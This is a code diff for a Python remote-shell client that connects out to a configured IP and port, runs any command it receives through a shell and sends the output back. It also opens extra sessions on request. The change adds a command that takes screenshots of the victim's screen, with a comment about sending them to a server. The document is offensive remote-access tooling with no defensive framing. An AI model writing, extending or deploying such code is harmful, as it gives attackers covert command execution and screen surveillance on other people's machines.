@@ -1,8 +1,9 @@
 # imports
-import os, socket, subprocess, threading, logging, sys, platform
-from dotenv import load_dotenv
+import os, socket, subprocess, threading, logging, sys, platform, pyautogui, time
 
-load_dotenv()  # load .env file
+# Load environment variables from a .env file
+from dotenv import load_dotenv
+load_dotenv()
 
 # Get default IP and port from environment variables
 ip_address = os.getenv("IP", "127.0.0.1")
@@ -14,7 +15,7 @@ if len(sys.argv) == 3:
 
 server_address = f"{ip_address}:{port}"
 
-# Configure logging (remove 'server' field, log messages manually)
+# Configure logging
 logging.basicConfig(
     filename="session.log",
     level=logging.INFO,
@@ -28,14 +29,25 @@ def log_message(message, server_info):
     print(formatted_message)  # Print to terminal
     logging.info(formatted_message)  # Log to file
 
+def capture_and_process(server_info):
+    """Captures a screenshot, processes it, and deletes the temporary file."""
+    # Capture a screenshot
+    screenshot = pyautogui.screenshot()
 
-"""
-Socket to process
-Connects client to the server and reads up to 1024 bytes of data.
-@param socket s
-@param process p
-"""
+    # Save the screenshot temporarily
+    temp_path = "temp_screenshot.png"
+    screenshot.save(temp_path)
+
+    # Process the screenshot (e.g., send it to a server)
+    # For demonstration, we'll just log a message
+    log_message(f"Processed screenshot saved at {temp_path}", server_info)
+
+    # Delete the temporary screenshot
+    os.remove(temp_path)
+    log_message(f"Deleted temporary screenshot at {temp_path}", server_info)
+
 def s2p(s, p, server_info):
+    """Socket to process: Connects client to the server and reads up to 1024 bytes of data."""
     while True:
         s.sendall((os.getcwd() + "> ").encode())
         data = s.recv(1024).decode().strip()
@@ -63,6 +75,7 @@ def s2p(s, p, server_info):
                 msg = f"Error: {str(e)}\n"
                 s.sendall(msg.encode())
                 log_message(msg, server_info)
+
         elif data.lower().startswith("new_terminal "):  # Handle new terminal command
             try:
                 _, new_ip, new_port = data.split() # _ = command, ip = ip, port = port
@@ -78,7 +91,10 @@ def s2p(s, p, server_info):
             except ValueError:
                 msg = "Usage: new_terminal <IP> <PORT>\n"
                 s.sendall(msg.encode())
-                log_message(msg, server_info)            
+                log_message(msg, server_info)    
+                        
+        elif data.lower().startswith("capture_screenshot"):  # Handle screenshot command
+            capture_and_process(server_info)
         else:
             process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             output, error = process.communicate()
@@ -89,13 +105,8 @@ def s2p(s, p, server_info):
                 s.sendall(error)
                 log_message(error.decode(), server_info)
 
-"""
-Process to socket
-Transfers data from a process's standard output to a socket, sending one byte at a time.
-@param socket s
-@param process p
-"""
 def p2s(s, p, server_info):
+    """Process to socket: Transfers data from a process's standard output to a socket."""
     while True:
         output = p.stdout.read(1)
         if output:
